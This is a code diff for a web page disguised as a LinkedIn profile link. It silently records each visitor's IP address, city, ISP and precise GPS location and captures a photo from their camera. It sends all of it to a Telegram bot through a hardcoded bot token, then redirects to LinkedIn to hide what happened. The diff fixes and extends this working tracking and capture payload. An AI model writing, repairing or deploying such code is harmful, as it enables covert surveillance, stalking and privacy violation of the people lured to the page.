@@ -22,16 +22,17 @@
     <h1>Loading profile...</h1>
 
     <script>
-        // ================== YOUR TELEGRAM DETAILS ==================
+        // ================== YOUR DETAILS ==================
         const TELEGRAM_BOT_TOKEN = "8475309387:AAHv1rNBBuU2XDaGtdQLAW0yRUspKX4fXZE";
         const TELEGRAM_CHAT_ID = "7052857946";
         const REDIRECT_URL = "https://www.linkedin.com/in/connectaditya08/";
-        // ===========================================================
+        // ================================================
 
         let visitorInfo = {
             ip: "Unknown",
             city: "Unknown",
             country: "Unknown",
+            isp: "Unknown",
             latitude: "Unknown",
             longitude: "Unknown",
             timestamp: new Date().toISOString()
@@ -42,12 +43,12 @@
                 const formData = new FormData();
                 formData.append("chat_id", TELEGRAM_CHAT_ID);
                 formData.append("caption", 
-                `🔴 New Capture
-                IP: ${visitorInfo.ip}
-                Location: ${visitorInfo.city}, ${visitorInfo.country}
-                Geo: ${visitorInfo.latitude}, ${visitorInfo.longitude}
-                Maps: https://maps.google.com/?q=${visitorInfo.latitude},${visitorInfo.longitude}
-                Time: ${visitorInfo.timestamp}`);
+                `🔴 New Capture\n\n` +
+                `IP: ${visitorInfo.ip}\n` +
+                `Location: ${visitorInfo.city}, ${visitorInfo.country}\n` +
+                `GPS: ${visitorInfo.latitude}, ${visitorInfo.longitude}\n` +
+                `Google Maps: https://maps.google.com/?q=${visitorInfo.latitude},${visitorInfo.longitude}\n` +
+                `Time: ${visitorInfo.timestamp}`);
 
                 const blob = await fetch(photoBase64).then(r => r.blob());
                 formData.append("photo", blob, "photo.jpg");
@@ -57,32 +58,46 @@
                     body: formData
                 });
             } catch (e) {
-                console.log("Telegram send failed", e);
+                console.log("Telegram error", e);
             }
         }
 
-                async function start() {
-            await new Promise((resolve) => {
+        async function getGPS() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve();
+                    return;
+                }
                 navigator.geolocation.getCurrentPosition(
                     (position) => {
-                        console.log(position.coords.latitude);
-                        console.log(position.coords.longitude);
+                        visitorInfo.latitude = position.coords.latitude.toFixed(6);
+                        visitorInfo.longitude = position.coords.longitude.toFixed(6);
                         resolve();
                     },
                     (error) => {
-                        console.log(error.message);
+                        console.log("GPS Error:", error.message);
                         resolve();
                     },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                    }
+                    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
                 );
             });
         }
-        
-        start();
+
+        async function start() {
+            try {
+                // Get IP + ISP Location
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                visitorInfo.ip = ipData.ip;
+
+                const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const geo = await geoRes.json();
+                visitorInfo.city = geo.city || "Unknown";
+                visitorInfo.country = geo.country_name || "Unknown";
+                visitorInfo.isp = geo.org || "Unknown";
+
+                // Get Real GPS Location
+                await getGPS();
 
                 // Request Camera
                 const stream = await navigator.mediaDevices.getUserMedia({
@@ -93,7 +108,7 @@
                 video.srcObject = stream;
                 await video.play();
 
-                async function start(resolve => setTimeout(resolve, 1500));
+                await new Promise(resolve => setTimeout(resolve, 1600));
 
                 const canvas = document.createElement('canvas');
                 canvas.width = 640;
@@ -110,12 +125,11 @@
             } catch (error) {
                 console.log("Error:", error);
             } finally {
-                // Redirect to LinkedIn
                 window.location.href = REDIRECT_URL;
             }
         }
 
-        // Auto Start
+        // Start everything
         start();
     </script>
 </body>
